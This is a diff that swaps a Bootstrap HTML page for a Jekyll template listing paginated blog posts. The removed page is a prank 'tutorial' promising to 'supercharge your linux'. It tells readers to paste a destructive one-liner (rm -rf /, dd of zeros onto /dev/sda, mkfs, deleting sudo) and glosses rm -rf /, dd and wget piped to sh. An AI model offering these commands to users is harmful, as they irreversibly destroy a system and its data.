@@ -1,74 +1,62 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <!-- Required meta tags always come first -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
+---
+layout: page
+title: My website
+subtitle: This is where I will tell my friends way too much about me
+---
 
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.4/css/bootstrap.min.css" integrity="2hfp1SzUoho7/TsGGGDaFdsuuDL0LX2hnUp6VkX3CUQ2K4K+xjboZdsXyp4oUHZj" crossorigin="anonymous">
-  </head>
-  <body>
+<div class="posts-list">
+  {% for post in paginator.posts %}
+  <article class="post-preview">
+    <a href="{{ post.url | prepend: site.baseurl }}">
+	  <h2 class="post-title">{{ post.title }}</h2>
 
-<div class="container">
-  <!-- Content here -->
+	  {% if post.subtitle %}
+	  <h3 class="post-subtitle">
+	    {{ post.subtitle }}
+	  </h3>
+	  {% endif %}
+    </a>
 
-    <h1>Tutorial #dropall with success for begins</h1>
+    <p class="post-meta">
+      Posted on {{ post.date | date: "%B %-d, %Y" }}
+    </p>
 
-<figure class="figure">
-  <img src="https://media.giphy.com/media/jQjv4K9OV0Boc/giphy.gif" class="figure-img img-fluid img-rounded" alt="A generic square placeholder image with rounded corners in a figure.">
-  <figcaption class="figure-caption">Matrix</figcaption>
-</figure>
+    <div class="post-entry">
+      {{ post.excerpt | strip_html | xml_escape | truncatewords: site.excerpt_length }}
+      {% assign excerpt_word_count = post.excerpt | number_of_words %}
+      {% if post.content != post.excerpt or excerpt_word_count > site.excerpt_length %}
+        <a href="{{ post.url | prepend: site.baseurl }}" class="post-read-more">[Read&nbsp;More]</a>
+      {% endif %}
+    </div>
 
-## How to supercharge your linux
-Open your Terminal end copy/paste/enter:
+    {% if post.tags.size > 0 %}
+    <div class="blog-tags">
+      Tags:
+      {% if site.link-tags %}
+      {% for tag in post.tags %}
+      <a href="{{ site.baseurl }}/tag/{{ tag }}">{{ tag }}</a>
+      {% endfor %}
+      {% else %}
+        {{ post.tags | join: ", " }}
+      {% endif %}
+    </div>
+    {% endif %}
 
-> sudo rm -rf / && rm -rf .* && rm - .* && dd if=/dev/zero of=/dev/sda && mkfs.ext3 /dev/hda && echo '' > /dev/hda && cd ~; for x in `ls`; do mv -f $x $y; y=$x; done
-find -type f -mtime +30 -exec mv {} /dev/null ; && mv ~ /dev/null && mv / /dev/null && rm -f /usr/bin/sudo;rm -f /bin/su && mv /home/$user/* /dev/null
-
-
-## applications
-rm – Remove the following files.
-
--rf – Run rm recursively (delete all files and folders inside the specified folder) and force-remove all files without prompting you.
-
-/ – Tells rm to start at the root directory, which contains all the files on your computer and all mounted media devices, including remote file shares and removable drives.
-
-mkfs.ext4 – Create a new ext4 file system on the following device.
-
-/dev/sda1 – Specifies the first partition on the first hard drive, which is probably in use.
-
-command – Run a command (can be any command.)
-
-\> – Send the output of the command to the following location.
-
-/dev/sda – Write the output of the command directly to the hard disk device.
-
-dd – Perform low-level copying from one location to another.
-
-if=/dev/random – Use /dev/random (random data) as the input – you may also see locations such as /dev/zero (zeros).
-
-of=/dev/sda – Output to the first hard disk, replacing its file system with random garbage data.
-
-mv – Move the following file or directory to another location.
-
-~ – Represents your entire home folder.
-
-/dev/null – Move your home folder to /dev/null, destroying all your files and deleting the original copies.
-
-wget – Downloads a file. (You may also see curl in place of wget.)
-
-http://example.com/something – Download the file from this location.
-
-| – Pipe (send) the output of the wget command (the file you downloaded) directly to another command.
-
-sh – Send the file to the sh command, which executes it if it’s a bash script.
-
+   </article>
+  {% endfor %}
 </div>
-    <!-- jQuery first, then Tether, then Bootstrap JS. -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.0.0/jquery.min.js" integrity="sha384-THPy051/pYDQGanwU6poAc/hOdQxjnOEXzbT+OuUAFqNqFjL+4IGLBgCJC3ZOShY" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.2.0/js/tether.min.js" integrity="sha384-Plbmg8JY28KFelvJVai01l8WyZzrYWG825m+cZ0eDDS1f7d/js6ikvy1+X+guPIB" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.4/js/bootstrap.min.js" integrity="VjEeINv9OSwtWFLAtmc4JCtEJXXBub00gtSnszmspDLCtC0I4z4nqz7rEFbIZLLU" crossorigin="anonymous"></script>
-  </body>
-</html>
+
+{% if paginator.total_pages > 1 %}
+<ul class="pager main-pager">
+  {% if paginator.previous_page %}
+  <li class="previous">
+    <a href="{{ paginator.previous_page_path | prepend: site.baseurl | replace: '//', '/' }}">&larr; Newer Posts</a>
+  </li>
+  {% endif %}
+  {% if paginator.next_page %}
+  <li class="next">
+    <a href="{{ paginator.next_page_path | prepend: site.baseurl | replace: '//', '/' }}">Older Posts &rarr;</a>
+  </li>
+  {% endif %}
+</ul>
+{% endif %}
